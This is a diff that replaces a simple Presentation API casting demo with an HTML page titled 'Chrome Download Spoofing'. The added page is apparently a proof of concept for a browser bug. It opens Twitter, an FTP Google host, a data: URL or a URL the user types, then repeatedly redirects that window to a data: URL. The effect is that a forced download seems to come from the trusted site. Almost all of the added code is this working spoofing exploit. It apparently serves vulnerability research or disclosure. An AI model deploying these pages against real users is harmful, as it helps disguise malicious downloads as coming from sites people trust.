@@ -1,50 +1,76 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>javascript:alert(1)</title>
-  <style>
-    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
-    #log { margin-top: 20px; padding: 10px; background: #f0f0f0; text-align: left; white-space: pre-wrap; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Chrome Download Spoofing</title>
 </head>
 <body>
-  <h1>Presentation API Simple Demo</h1>
-  <button id="start">Start Presentation (Cast)</button>
+    <p class="twitter">Click here to spoof on twitter</p>
+    <p class="ftp">Click here for a invalid ftp origin spoof</p>
+    <p class="data">Click here for a invalid data: spoof</p>
+    <p class="user">Click here to spoof an prompted domain</p>
+    <a href=/parent.html target=_blank>Click here for an example using opener frame</a>
+    <hr>
+    <p>you can change which sites are blocked / allowd via chrome://settings/content/automaticDownloads to reproduce behavior</p>
+    <script>
+        const twitterEle = document.querySelector('.twitter')
+        const ftpEle = document.querySelector('.ftp')
+        const dataEle = document.querySelector('.data')
+        const userEle = document.querySelector('.user')
 
-  <pre id="log"></pre>
-
-  <script>
-    function log(message) {
-      document.getElementById('log').textContent += message + '\n';
-    }
-
-    // Ganti dengan file receiver kamu (harus di folder/server yang sama)
-    const presentationRequest = new PresentationRequest(['receiver.html']);
-
-    // Jadikan default untuk menu Cast di browser
-    if ('presentation' in navigator) {
-      navigator.presentation.defaultRequest = presentationRequest;
-    } else {
-      log('Presentation API tidak didukung di browser ini.');
-    }
-
-    let connection = null;
-
-    document.getElementById('start').addEventListener('click', () => {
-      log('Memulai presentation request...');
-
-      presentationRequest.start()
-        .then(conn => {
-          connection = conn;
-          log(`Berhasil terhubung! ID: ${conn.id}`);
-          log(`URL receiver: ${conn.url}`);
+        twitterEle.addEventListener('click', e => {
+            let ref = window.open('https://twitter.com')
+            ref.focus();
+            let attempts = 0
+            let id = setInterval( () => {
+                if(attempts > 3) {
+                    clearInterval(id)
+                }
+                ref.location.href = 'data:foo/bar,# This is a message from twitter.com';
+                attempts++
+            }, 500)
         })
-        .catch(err => {
-          log(`Error: ${err.name} - ${err.message}`);
-        });
-    });
-  </script>
+
+        ftpEle.addEventListener('click', e => {
+            let ref = window.open('ftp://secure.google.com')
+            ref.focus();
+            let attempts = 0
+            let id = setInterval( () => {
+                if(attempts > 3) {
+                    clearInterval(id)
+                }
+                ref.location.href = 'data:foo/bar,# This is a message from google';
+                attempts++
+            }, 500)
+        })
+
+        dataEle.addEventListener('click', e => {
+            let ref = window.open('data:invalid')
+            ref.focus();
+            let attempts = 0
+            let id = setInterval( () => {
+                if(attempts > 3) {
+                    clearInterval(id)
+                }
+                ref.location.href = 'data:foo/bar,# This is a message from facebook';
+                attempts++
+            }, 500)
+        })
+
+        userEle.addEventListener('click', e => {
+            let ref = window.open(prompt('enter url, including https'))
+            ref.focus();
+            let attempts = 0
+            let id = setInterval( () => {
+                if(attempts > 3) {
+                    clearInterval(id)
+                }
+                ref.location.href = 'data:foo/bar,# This is a message from you';
+                attempts++
+            }, 500)
+        })
+    </script>
 </body>
 </html>
